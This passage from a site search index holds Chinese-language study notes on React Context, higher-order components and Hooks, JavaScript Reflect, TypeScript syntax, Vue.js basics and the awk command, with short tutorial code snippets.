中比较特殊的对象，是一种组件中传值的特殊方式。\n因为 React 中的数据流向是单向的，所以如果需要在层级很深的组件树中传值的话，需要不断地从 props 中向下传值，Context 则解决了这个问题（不同层级的组件需要访问同样一些数据）。\nReact 相关 API：\n   API 作用     React.createContext 创建一个 Context 对象，接收一个“默认值”作为参数   Context.Provider 一个 React 组件，接受一个 value 的属性值。被这个组件包裹的子组件都可以使用这个属性值。   contextType 将一个组件的 static 属性 contextType 设置为对应的 Context 对象，即可在这个组件内部的任意生命周期函数中，通过 this.context 访问到 Provider 提供的属性值。   Context.Cosumer 一个 React 组件，接受一个函数作为其包裹的内容，函数的参数即为 Provider 的 value 值。    注意事项：\n context 的默认值，只有在 Cosumer 的外层没有 Provider 包裹的时候使用； Provider 支持多层嵌套； 消费组件的更新只取决于 Provider 是否更新，不会执行 shouldComponentUpdate；  高阶组件 #  定义：高阶组件（high order components）是参数为组件且返回值也为组件的函数。\n编写方式 #  根据高阶组件内容的编写方式可以分为“组合”和“反向继承”两种方式。\n组合：因为这种方式的编写中通常是对属性的一些操作，所以又被称为“属性代理”：\nconst hoc = data =\u0026gt; Wrapper =\u0026gt; { return class HOC extends React.Component { render() { return \u0026lt;Wrapper {...this.props} {...ExtraPorps} /\u0026gt; } } } PS: 这里体现了函数式编程的“柯里 curry 化”思想，即将接受多个参数的函数拆分成接受单个参数的多个函数。\n反向继承：返回的新组件继承于新组件：\nconst LOGHOC = Wrapper =\u0026gt; { return class HOC extends Wrapper { render() { return super.render(); } } } React 高阶组件的编写比较推荐使用“组合”的方式，以后继承会对原来组件的一些内容进行修改。\n使用场景 #  场景一：操作 props。\nexport const PropsHOC = Wrapper =\u0026gt; logContent =\u0026gt; { return class HOC extends React.Component { handleClick = () =\u0026gt; { console.log(logContent); this.props.onClick(); } render() { return \u0026lt;Wrapper onClick={this.handleClick} /\u0026gt; } } } 场景二：通过 ref 访问组件实例；\n场景三：组件状态提升；\n场景四：用其他元素包装组件。\n注意事项与调试技巧 #    不要改变组件原型：\n 即不要通过 prototype 等方式影响组件本身的特性。建议通过组合的方式新增函数。    应该将不相关的 props，透传给被包裹的组件。\n  通过将函数柯里化最大化高阶组件的可组合性。\n  给组件设置 displayName 属性，可以在 chrome 进行调试时展示对应组件的名称。\n  不要在任何生命周期方法中使用 HOC。\n  Fragment/Portal #  Fragment 的作用？\n Fragment 支持在代码中聚合子元素的列表，并不会在 DOM 中添加新的节点（通常用 div 实现）。  Portal 的作用？\n Portal 支持实现像弹窗类似的功能； 它在 DOM 上会将对应的元素传送到视图树的指定位置，但是响应冒泡仍然遵循 React 代码中的定义。  调和思想 #  O(n) 事件复杂度的 diff 算法。为了实现列表的重复检测，给定了 key 属性。\n"},{"id":336,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/reactjs/hooks/","title":"Hooks","section":"reactjs","content":" 参考文档：\n https://zh-hans.reactjs.org/docs/hooks-intro https://www.yuque.com/qianduanyongbuweinu/efahmp/vasyzy#8OGwa   Hooks #  例子 #  与 Hooks 相关的 API 都是 use 开头的，它返回一个元组。以 useState 为例，它返回第一个元素即这个状态，第二个元素是设置这个状态的函数。\n先看一个 useState 使用的例子：\nexport const MyComponent: React.FC = () =\u0026gt; { const [st, setSt] = useState\u0026lt;bool\u0026gt;(false); return ( \u0026lt;div\u0026gt; \u0026lt;button onClick={setSt} /\u0026gt; \u0026lt;span\u0026gt;{st}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; ) } 另一个常见的 Hooks 函数即 useEffect，类似于 OOP 中的 componentDidMount 与 componentDidUpdate：\nexport const MyComponent: React.FC = () =\u0026gt; { const [count, setCount] = useState(0); useEffect(() =\u0026gt; { document.title = `You clicked ${count}times`; }); return (\u0026lt;div\u0026gt;\u0026lt;/div\u0026gt;) } 简介 #  作为一种改变组件状态、处理组件副作用的方式，Hooks 这个概念最早由React提出，而后被推广到其他框架，诸如 Vue、Svelte，甚至出现了原生JS库。但是，要熟练使用 Hook s需要对 JS 闭包有比较好的理解。\n什么是 js 闭包？\n 当代码已经执行到一个函数词法作用域之外，但是这个函数仍然可以记住并访问他的词法作用域，那么他就形成了闭包。  使用规则 #  在 React 官方文档中，对 Hooks 的使用做出了以下两条规则的限制：\n 只在控制流的最顶层使用 Hooks，也就是说不要在循环、条件、嵌套函数中使用 Hooks； 只在 React.FC 中使用 Hooks，不要在普通的 js 函数中使用 Hooks；  这是因为 React Hooks 的底层实现机制导致的，可以回答下面问题就能理解这两条限制。\n一个函数组件中会使用多个 state，那么 React 怎么知道哪个 state 对应哪个 useState？\n effect 与 state 在 React Hook 的底层是用两个数组实现的，React 是通过调用顺序确定它们的映射关系的。  自定义 Hooks #  React Hooks 是一个非常强大的工具、非常通用的设计模式。\nReact 同样提供了自定义 Hooks 的方式，自定义 Hooks 都以 use 开头，有非常繁荣的第三方生态。\n"},{"id":337,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/reflect/","title":"Reflect","section":"JavaScript","content":" https://es6.ruanyifeng.com/#docs/reflect\n Reflect #  概述 #  Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API。Reflect对象的设计目的有这样几个：\n 将 Object 对象的一些明显属于语言内部的方法（比如 Object.defineProperty），放到 Reflect 对象上。现阶段，某些方法同时在 Object 和 Reflect 对象上部署，未来的新方法将只部署在 Reflect 对象上。也就是说，从 Reflect 对象上可以拿到语言内部的方法。 修改某些 Object 方法的返回结果，让其变得更合理。比如，Object.defineProperty(obj, name, desc) 在无法定义属性时，会抛出一个错误，而 Reflect.defineProperty(obj, name, desc) 则会返回 false。 让 Object 操作都变成函数行为。某些 Object 操作是命令式，比如 name in obj 和 delete obj[name]，而 Reflect.has(obj, name) 和 Reflect.deleteProperty(obj, name) 让它们变成了函数行为。 Reflect 对象的方法与 Proxy 对象的方法一一对应，只要是 Proxy 对象的方法，就能在 Reflect 对象上找到对应的方法。这就让 Proxy 对象可以方便地调用对应的 Reflect 方法，完成默认行为，作为修改行为的基础。也就是说，不管 Proxy 怎么修改默认行为，你总可以在 Reflect 上获取默认行为。  MetaData #  API 详见：https://www.npmjs.com/package/reflect-metadata\n用 Decorator 声明式调用：\nclass C { @Reflect.metadata(metadataKey, metadataValue) method() { } } 直接定义式调用：\nReflect.defineMetadata(metadataKey, metadataValue, C.prototype, \u0026#34;method\u0026#34;); 通过 Reflect 获取之前定义的值：\nlet obj = new C(); let metadataValue = Reflect.getMetadata(metadataKey, obj, \u0026#34;method\u0026#34;); "},{"id":338,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/stackoverflow/","title":"Stack Overflow","section":"typescript","content":"Stack Overflow #   来自 StackOverflow 上的大神教程。\n 如何得到一个类派生出的所有子类型：https://stackoverflow.com/questions/42414045/how-to-get-child-classes-which-implement-a-certain-base-class-using-reflection-i\nexport default function hierarchyTracked(target: new (...args: any[]) =\u0026gt; object) { for (const proto of walkPrototypeChain(target)) { if (!Object.hasOwnProperty.call(proto, \u0026#39;extendedBy\u0026#39;)) { const extendedBy: typeof Function.extendedBy = []; Object.defineProperty(proto, \u0026#39;extendedBy\u0026#39;, { get: () =\u0026gt; extendedBy }); } // ! is used to suppress a strictNullChecks error on optional.  // This is OK since we know it is now defined.  proto.extendedBy!.push(target); } } declare global { interface Function { // Declared as optional because not all classes are extended.  extendedBy?: Array\u0026lt;new (...args: any[]) =\u0026gt; object\u0026gt;; } } function* walkPrototypeChain(target: new (...args: any[]) =\u0026gt; object) { let proto = Reflect.getPrototypeOf(target); while (proto \u0026amp;\u0026amp; proto !== Object) { yield proto; proto = Reflect.getPrototypeOf(proto); } } "},{"id":339,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/trick/","title":"Trick","section":"typescript","content":"Trick #  定义 getter setter，在类方法前使用关键字 get/set；\n https://www.typescriptlang.org/docs/handbook/classes.html#accessors  使用 @ 符号，引用 Decorator：\n https://www.typescriptlang.org/docs/handbook/decorators.html#property-decorators  使用模版字符串：\n https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals  "},{"id":340,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E5%85%B6%E4%BB%96/","title":"其他","section":"typescript","content":"Mixin #  Mixin 本身是一种设计模式，它指不通过继承而是通过混入，将一个类的方法添加到另一个类中。这通常用于解决多继承的问题（一个子类不能同时继承两个基类）。\nTypeScript 官方文档给出了一个 mixin 的方法：https://www.typescriptlang.org/docs/handbook/mixins.html：\n// Each mixin is a traditional ES class class Jumpable { jump() {} } class Duckable { duck() {} } // Including the base class Sprite { x = 0; y = 0; } // Then you create an interface which merges // the expected mixins with the same name as your base interface Sprite extends Jumpable, Duckable {} // Apply the mixins into the base class via // the JS at runtime applyMixins(Sprite, [Jumpable, Duckable]); let player = new Sprite(); player.jump(); console.log(player.x, player.y); // This can live anywhere in your codebase: function applyMixins(derivedCtor: any, constructors: any[]) { constructors.forEach((baseCtor) =\u0026gt; { Object.getOwnPropertyNames(baseCtor.prototype).forEach((name) =\u0026gt; { Object.defineProperty( derivedCtor.prototype, name, Object.getOwnPropertyDescriptor(baseCtor.prototype, name) || Object.create(null) ); }); }); } "},{"id":341,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.基本语法","section":"菜鸟教程","content":"内置类型 #  类型是 TypeScript 相较于 JavaScript 增加的特性，也是 TpyeScript 的重点内容。\n变量声明 #  声明变量的类型及初始值：\nvar [变量名] : [类型] = 值; **注意：**变量不要使用 name 否则会与 DOM 中的全局 window 对象下的 name 属性出现了重名。\n类型断言（C++ 中的强制类型转换，但并不完全是）：\n\u0026lt;类型\u0026gt; 值 值 as 类型   当 S 类型是 T 类型的子集，或者 T 类型是 S 类型的子集时，S 能被成功断言成 T。这是为了在进行类型断言时提供额外的安全性，完全毫无根据的断言是危险的，如果你想这么做，你可以使用 any。\n  它之所以不被称为类型转换，是因为转换通常意味着某种运行时的支持。但是，类型断言纯粹是一个编译时语法，同时，它也是一种为编译器提供关于如何分析代码的方法。\n  类型推断（C++ 中的 auto）：使用 var 关键字。\nAny 类型 #  任意值是 TypeScript 针对编程时类型不明确的变量使用的一种数据类型，类型核心在于不在编译时进行类型检查。\nlet x: any = 1; x = \u0026#39;I am who I am\u0026#39;; // 正确，Any 可以指向任意类型  x.ifItExists(); // 正确，ifItExists方法在运行时可能存在，但这里并不会检查  let arrayList: any[] = [1, false, \u0026#39;fine\u0026#39;]; arrayList[1] = 100;\t// 正确，数组内容是 Any 类型 void/null/undefined/never #  void：\n 用于标识方法返回值的类型，表示该方法没有返回值。  null：\n  在 JavaScript 中 null 表示 \u0026ldquo;什么都没有\u0026rdquo;。\n  null 是一个只有一个值的特殊类型。表示一个空对象引用。\n  typeof null === 'object'\n  undefined：\n 在 JavaScript 中，undefined 是一个没有设置值的变量。 typeof 一个没有值的变量会返回 undefined。 null 和 undefined 是其他任何类型（包括 void）的子类型，可以赋值给其它类型，如数字类型，此时，赋值后的类型会变成 null 或 undefined。 而在 TypeScript 中启用严格的空校验特性，就可以使得 null 和 undefined 只能被赋值给 void 或本身对应的类型。  never：\n never 是其它类型（包括 null 和 undefined）的子类型，代表从不会出现的值。 这意味着声明为 never 类型的变量只能被 never 类型所赋值，在函数中它通常表现为抛出异常或无法执行到终止点的函数；  "},{"id":342,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/2.%E6%8E%A7%E5%88%B6%E6%B5%81/","title":"2.控制流","section":"菜鸟教程","content":"控制流 #  条件判断 #  循环 #  函数 #  参数类型 #  函数可以指定返回值类型与参数类型，比如：\nfunction add(x: number, y: number): string { // ... }  上面定义的是两个 number 类型为参数，一个 string 类型为返回值的函数。  函数重载 #  可以通过参数类型对相同函数名进行重：\nfunction disp(string):void; function disp(number):void; "},{"id":343,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/3.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/","title":"3.内置类型","section":"菜鸟教程","content":"内置类型 #  Number #  概述 #  TypeScript 与 JavaScript 类似，支持 Number 对象。Number 对象是原始数值的包装对象。\n对象属性 #  Number 对象支持的属性：\n MAX_VALUE、MIN_VALUE、NaN、NEGATIVE_INFINITY、POSITIVE_INFINITY prototype、constructor；  对象方法 #     序号 方法 \u0026amp; 描述     1. toExponential()：把对象的值转换为指数计数法。   2. toFixed()：把数字转换为字符串，并对小数点指定位数。   3. toLocaleString()：把数字转换为字符串，使用本地数字格式顺序。   4. toPrecision()：把数字格式化为指定的长度。   5. toString()：把数字转换为字符串，使用指定的基数。数字的基数是 2 ~ 36 之间的整数。若省略该参数，则使用基数 10。   6. valueOf()：返回一个 Number 对象的原始数字值。    String #  对象属性 #  String 对象支持的属性：\n length 返回字符串的长度； constructor、prototype；  对象方法 #  见：https://www.runoob.com/typescript/ts-string.html\nArray #  构造 #  Array 对象的构造函数接受以下两种值：\n 表示数组大小的数值。 初始化的数组列表，元素使用逗号分隔值。  例子：\nvar arr_names:number[] = new Array(4); var sites:string[] = new Array(\u0026#34;Google\u0026#34;,\u0026#34;Runoob\u0026#34;,\u0026#34;Taobao\u0026#34;,\u0026#34;Facebook\u0026#34;) 数组方法 #  见：https://www.runoob.com/typescript/ts-array.html\nMap #  类型声明：可以使用 Record\u0026lt;Type1, Type2\u0026gt;；\n元组 #  我们知道数组中元素的数据类型都一般是相同的（any[] 类型的数组可以不同），如果存储的元素数据类型不同，则需要使用元组。\n元组中允许存储不同类型的元素，元组可以作为参数传递给函数。\n创建元组的语法格式如下：\nvar tuple_name = [value1,value2,value3,…valuen] 元组的类型声明。\n比如一个 number 类型和一个 string 类型作为元组：\nvar tup : [number, string] = [1, \u0026#39;h\u0026#39;]; 联合类型 #  创建联合类型的语法格式如下：\nType1|Type2|Type3 联合类型向单个类型的转化可以使用 as 关键字。\n枚举 #  枚举的定义使用 enum 关键词。\n例子：\nenum Direction { Up = 1, Down, Left, Right } "},{"id":344,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"4.面向对象","section":"菜鸟教程","content":"面向对象 #  接口 #  TypeScript 接口定义如下：\ninterface RunOptions { program:string; commandline:string[]|string|(()=\u0026gt;string); } 在 Interface 中定义方法：\ninterface IEmployee { getSalary: (number) =\u0026gt; number; // arrow function  getManagerName(number): string; } Interface 可以定义方法类型。\n继承使用关键字 extends，单接口继承语法格式：\nChild_interface_name extends super_interface_name 多接口继承语法格式：\nChild_interface_name extends super_interface1_name, super_interface2_name,…,super_interfaceN_name 类 #  定义类的关键字为 class，后面紧跟类名，类可以包含以下几个模块（类的数据成员）：\n 字段：字段是类里面声明的变量。字段表示对象的有关数据。 构造函数：类实例化时调用，可以为类的对象分配内存。 方法：方法为对象要执行的操作。  比如：\nclass Car { // 字段  engine:string; // 构造函数  constructor(engine:string) { this.engine = engine } // 方法  disp():void { console.log(\u0026#34;函数中显示发动机型号 : \u0026#34;+this.engine) } } 类不能直接对外暴露，需要通过实现一个接口，外部通过接口调用。\n对象 #  泛型 #  "},{"id":345,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/5.%E6%A8%A1%E5%9D%97/","title":"5.模块","section":"菜鸟教程","content":"模块 #  导出模块 #  模块导出使用关键字 export 关键字，语法格式如下：\n// SomeInterface.ts export interface SomeInterface { // 代码部分 } 要在另外一个文件使用该模块就需要使用 import 关键字来导入:\nimport someInterfaceRef = require(\u0026#34;./SomeInterface\u0026#34;); 声明文件 #  常见到的 .d.ts 结尾的文件就是声明文件。\n在这个文件中使用 export module 语法或者 export namespace 语法，在项目的其他地方进行引用时，就可以不需要引用完整路径进行引用，比如：\n// dec.d.ts declare module \u0026#34;Dec\u0026#34; // ref.ts import * as des from \u0026#34;Dec\u0026#34;; TypeScript 作为 JavaScript 的超集，在开发过程中不可避免要引用其他第三方的 JavaScript 的库。虽然通过直接引用可以调用库的类和方法，但是却无法使用TypeScript 诸如类型检查等特性功能。\n为了解决这个问题，需要将这些库里的函数和方法体去掉后只保留导出类型声明，而产生了一个描述 JavaScript 库和模块信息的声明文件。通过引用这个声明文件，就可以借用 TypeScript 的各种特性来使用库文件了。\n比如使用 jQuery，我们需要使用 declare 关键字来定义它的类型，帮助 TypeScript 判断我们传入的参数类型对不对：\ndeclare var jQuery: (selector: string) =\u0026gt; any; jQuery(\u0026#39;#foo\u0026#39;); declare 定义的类型只会用于编译时的检查，编译结果中会被删除。\n"},{"id":346,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/javascript/vuejs/%E5%9F%BA%E7%A1%80/","title":"基础","section":"vuejs","content":"基础 #  介绍 #  起步 HelloWorld #  最简单的方式是可以使用以下的例子：\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ message }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data: { message: \u0026#39;Hello Vue.js!\u0026#39; } }) 声明式渲染 #  数据和 DOM 建立的连接都是响应式的 → 打开浏览器的 JavaScript 控制台，修改 app.message 的值，DOM 的内容会立即响应。除了绑定文本，我们还可以像如下方式绑定元素特性：\n\u0026lt;div id=\u0026#34;app-2\u0026#34;\u0026gt; \u0026lt;span v-bind:title=\u0026#34;message\u0026#34;\u0026gt; 鼠标悬停几秒钟查看此处动态绑定的信息。 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; var app2 = new Vue({ el: \u0026#34;#app-2\u0026#34; data: { message: \u0026#34;页面加载于\u0026#34; + new Data().toLacaleString() } }) 在 html 中的 v-bind 被称为指令，其中 v- 表示这是 Vue 提供的特殊特性，bind 为绑定属性的意思。在这里，该指令的意思是：将这个元素节点的 title 特性和 Vue 实例的 message 属性保持一致。\n条件与循环 #  使用 v-if 指令可以进行条件判断，比如以下的例子：\n\u0026lt;div id=\u0026#34;app-3\u0026#34;\u0026gt; \u0026lt;p v-if=\u0026#34;seen\u0026#34;\u0026gt; 现在你看到我了 \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; var app3 = new Vue({ el: \u0026#34;#app-3\u0026#34; data: { seen: true } }) 使用 v-for 指令可以用来绑定数组的数据来渲染一个项目列表：\n\u0026lt;div id=\u0026#34;app-4\u0026#34;\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34;\u0026gt; {{ todo.text }} \u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; var app4 = new Vue({ el: \u0026#34;#app-4\u0026#34;, data: { todos: [ {text: \u0026#34;学习 JavaScript\u0026#34;} {text: \u0026#34;学习 Vue\u0026#34;} {text: \u0026#34;学习 html\u0026#34;} ] } }) 处理用户输入 #  可以使用 v-on 指令添加一个事件监听器，通过该事件监听器调用在 Vue 实例中定义的方法：\n\u0026lt;div id=\u0026#34;app-5\u0026#34;\u0026gt; \u0026lt;p\u0026gt; {{ message }} \u0026lt;/p\u0026gt; \u0026lt;button v-on:click=\u0026#34;reverseMessage\u0026#34;\u0026gt; 逆转消息 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; var app5 = new Vue({ el: \u0026#34;#app-5\u0026#34;, data: { message: \u0026#34;Hellow Vue.js!\u0026#34; }, methods: { reverseMessage: function(){ this.message = this.message.split(\u0026#39;\u0026#39;).reverse().join(\u0026#39;\u0026#39;) } } }) Vue 还提供了 v-model 指令，它能轻松实现表单输入和应用状态之间的双向绑定，比如以下的例子：\n\u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ message }}\u0026lt;/p\u0026gt; \u0026lt;input v-model=\u0026#34;message\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data: { message: \u0026#39;Hello Vue.js!\u0026#39; } }) 组件化应用架构 #  在 Vue 里，一个组件本质上是一个拥有预定义选项的一个 Vue 实例。比如以下的例子定义了一个 todo-item 的组件，允许我们在 html 中使用：\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;app-7\u0026#34;\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;todo-item v-for = \u0026#34;item in groceryList\u0026#34; v-bind:todo = \u0026#34;item\u0026#34; v-bind:key = \u0026#34;item.id\u0026#34;\u0026gt; \u0026lt;/todo-item\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; 其中，html 文件中使用了 todo-item 这个组件，使用以下的 javascript 文件定义：\nVue.component(\u0026#34;todo-item\u0026#34;, { props: [\u0026#34;todo\u0026#34;], template: \u0026#34;\u0026lt;li\u0026gt;{{ todo.text }}\u0026lt;/li\u0026gt;\u0026#34; }) var app7 = new Vue({ el: \u0026#39;#app-7\u0026#39;, data: { groceryList: [ { id: 0, text: \u0026#39;蔬菜\u0026#39; }, { id: 1, text: \u0026#39;奶酪\u0026#39; }, { id: 2, text: \u0026#39;随便其它什么人吃的东西\u0026#39; } ] } }) PostScript：组件与自定义元素的关系：\n Web 组件规范仍然处于草案阶段，并且未被所有浏览器原生实现。相比之下，Vue 组件不需要任何 polyfill，并且在所有支持的浏览器 (IE9 及更高版本) 之下表现一致。必要时，Vue 组件也可以包装于原生自定义元素之内。 Vue 组件提供了纯自定义元素所不具备的一些重要功能，最突出的是跨组件数据流、自定义事件通信以及构建工具集成。  Vue 实例 #  每个 Vue 应用都是通过用 Vue 函数创建一个新的 Vue 实例开始的。Vue 的 API 文档。\n数据与方法 #  当一个 Vue 实例被创建时，它向 Vue 的响应式系统中加入了其 data 对象中能找到的所有的属性。\n当这些数据改变时，视图会进行重渲染 → 值得注意的是只有当实例被创建时 data 中存在的属性才是响应式的（也就是说，添加一个新的属性，将不会触发任何视图的更新）。\n这里唯一的例外是使用 Object.freeze()，这会阻止修改现有的属性，也意味着响应系统无法再追踪变化。比如以下的例子：\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;app-8\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ foo }}\u0026lt;/p\u0026gt; \u0026lt;button v-on:click=\u0026#34;foo = \u0026#39;text\u0026#39;\u0026#34;\u0026gt;Change Text\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; var obj = { foo: \u0026#34;bar\u0026#34; } Object.freeze(obj) var app8 = new Vue({ el: \u0026#34;#app-8\u0026#34;, data: obj, }) 除了数据属性，Vue 实例还暴露了一些有用的实例属性与方法。它们都有前缀 $，以便与用户定义的属性区分开来。比如：vm.$data $$\\Leftrightarrow$$ data（其中 vm 是一个 Vue 的实例）\n实例生命周期钩子 #  每个 Vue 实例在被创建时都要经过一系列初始化的的过程，在这个过程中会运行一些叫做生命周期钩子的函数，这给了用户在不同阶段添加自己的代码的机会。\n比如 create 钩子可以用来在一个实例被创建后执行代码：\nnew Vue({ data: { a: 1 }, created: function () { // `this` 指向 vm 实例  console.log(\u0026#39;a is: \u0026#39; + this.a) } }) 也有一些其他的钩子，在实例的生命周期不同阶段被调用，比如：mounted、update 和 destroyed。生命周期钩子中的 this 指向调用它的 Vue 实例。\nNote：不要在选项属性或回调上使用 箭头函数，比如：created: () =\u0026gt; console.log(this.a) 或 vm.$watch('a', newValue =\u0026gt; this.myMethod())。因为箭头函数是和父级上下文绑定在一起的。\n生命周期图示 #  模板语法 #  插值 #  数据绑定最常见的形式就是使用 “Mustache” 语法 (双大括号) 的文本插值：\n\u0026lt;span\u0026gt;Message: {{ msg }}\u0026lt;/span\u0026gt; 通过使用 v-once 指令，你也能执行一次性地插值，当数据改变时，插值处的内容不会更新。但请留心这会影响到该节点上的其它数据绑定：\n\u0026lt;span v-once\u0026gt;这个将不会改变: {{ msg }}\u0026lt;/span\u0026gt; 双大括号会将数据解释为普通文本，而非 HTML 代码。为了输出真正的 HTML，你需要使用 v-html 指令：\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;app-9\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ RawHtml }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;span v-html=\u0026#34;RawHtml\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; var obj = { RawHtml: \u0026#34;\u0026lt;span style=\u0026#39;color:red\u0026#39;\u0026gt;This should be red\u0026lt;/span\u0026gt;\u0026#34; } var app8 = new Vue({ el: \u0026#34;#app-9\u0026#34;, data: obj, }) Note：注意只对可信内容使用 HTML 插值，绝对不要使用用户提供的内容使用插值，因为它很容易导致 XSS。\nMustache 语法不能作用在 HTML 特性上，遇到这种情况应该使用 v-bind 指令：\n\u0026lt;div v-bind:id=\u0026#34;dynamicId\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 对于所有的数据绑定，Vue.js 都提供了完全的 JavaScript 表达式支持。不过每个绑定只能包含单个表达式，以下是一些例子：\n{{ number + 1 }} \u0026lt;!--生效--\u0026gt; {{ ok ? \u0026#39;YES\u0026#39; : \u0026#39;NO\u0026#39; }} \u0026lt;!--生效--\u0026gt; {{ var a = 1 }} \u0026lt;!--无效：这是语句，不是表达式--\u0026gt; PostScript：模板表达式都被放在沙盒中，只能访问全局变量的一个白名单，如 Math 和 Date 。你不应该在模板表达式中试图访问用户定义的全局变量。\n指令 #  指令 (Directives)：是带有 v- 前缀的特殊特性。指令特性的值预期是单个 JavaScript 表达式。指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM。\n一些指令能够接收一个“参数”，在指令名称之后以冒号表示。例如，v-bind 指令可以用于响应式地更新 HTML 特性：\n\u0026lt;a v-bind:href=\u0026#34;url\u0026#34;\u0026gt;...\u0026lt;/a\u0026gt; "},{"id":347,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/awk/","title":"Awk","section":"CommandSet","content":"Awk #  Brief Introduction #   学习网址：https://www.tecmint.com/use-linux-awk-command-to-filter-text-string-in-files/\n The general syntax of awk is:\n$ awk \u0026#39;script\u0026#39; filename # \u0026#39;script\u0026#39; format =\u0026gt; \u0026#39;/pattern/ action\u0026#39; Where 'script' is a set of commands that are understood by awk and execute on file, filename.\nIt works by reading a given line in the file, makes a copy of the line and then executes the script on the line. This is repeated on all the lines in the file.\nThe 'script' is in the form '/pattern/ action' where pattern is a regular expression and the action is what awk will do when it finds the given pattern in a line.\nThe GNU Awk User\u0026rsquo;s Guide #   学习网址：https://www.gnu.org/software/gawk/manual/gawk.html#Getting-Started\n awk is an interpreted language which means awk utility reads your program and then processes your data according to the instructions in your program. awk programs are data driven while most other languages are procedural.\nWhen you run awk, you specify an awk program that tells awk what to do. The program consists of a series of rules. Each rule specifies one pattern to search for and one action to perform upon finding the pattern.\nAn awk program looks like this:\npattern {action} pattern {action} 1. Run awk programs #  If the program is short, it is easiest to include it in the command that runs awk:\n$ awk \u0026#39;program\u0026#39; input-file1 input-file2 otehrwise:\n$ awk -f program-file input-file1 input-file2 1.1 Running #  Running without input files\n$ awk \u0026#39;program\u0026#39; awk applies the program to the standard input, which usually means whatever you type on the keyboard. This continues until you indicate end-of-file by typing Ctrl-d. (On non-POSIX operating systems, the end-of-file character may be different.)\nExecutable awk program\n#!/bin/awk -f BEGIN {print \u0026#34;Don\u0026#39;t Panic!\u0026#34;} 1.2 Example programs #  This is a typical task that awk programs do.\n$ ls -l | awk \u0026#39;$6 == \u0026#34;Nov\u0026#34;{ sum += $5 } \u0026gt;\tEND {print sum}\u0026#39;   The awk utility reads the input files one line at a time. For each line, awk tries the patterns of each rule. If several patterns match, then several actions execute in the order in which they appear in the awk program. If no patterns match, then no actions run.\n  This command prints the total number of bytes in all the files in the current directory that were last modified in November (of any year).\n  When awk statements within one rule are short, you might want to put more than one of them on a line. This is accomplished by separating the statements with a semicolon (‘;’). This also applies to the rules themselves. Thus, the program shown at the start of this section could also be written this way:\n$ ls -l | awk \u0026#39;$6 == \u0026#34;Nov\u0026#34;{ sum += $5 }; END {print sum}\u0026#39;   Print every line that has at least one field:\n$ awk \u0026#39;NF\u0026gt;0\u0026#39; data  default action is {print $0} NF stand for the fields amout in one line  Count line in a file:\n$ awk \u0026#39;END {print NR}\u0026#39; data 2. Running awk and gawk #  3. Regex Expression #  4. Reading Input Files #  The input is read in units called records, and is processed by the rules of your program one record at a time. By default, each record is one line. Each record is automatically split into chunks called fields. This makes it more convenient for programs to work on the parts of a record.\nRecord Split #  Record splitting with standard awk.\nRecords are separated by a character called the record separator. By default, the record separator is the newline character. This is 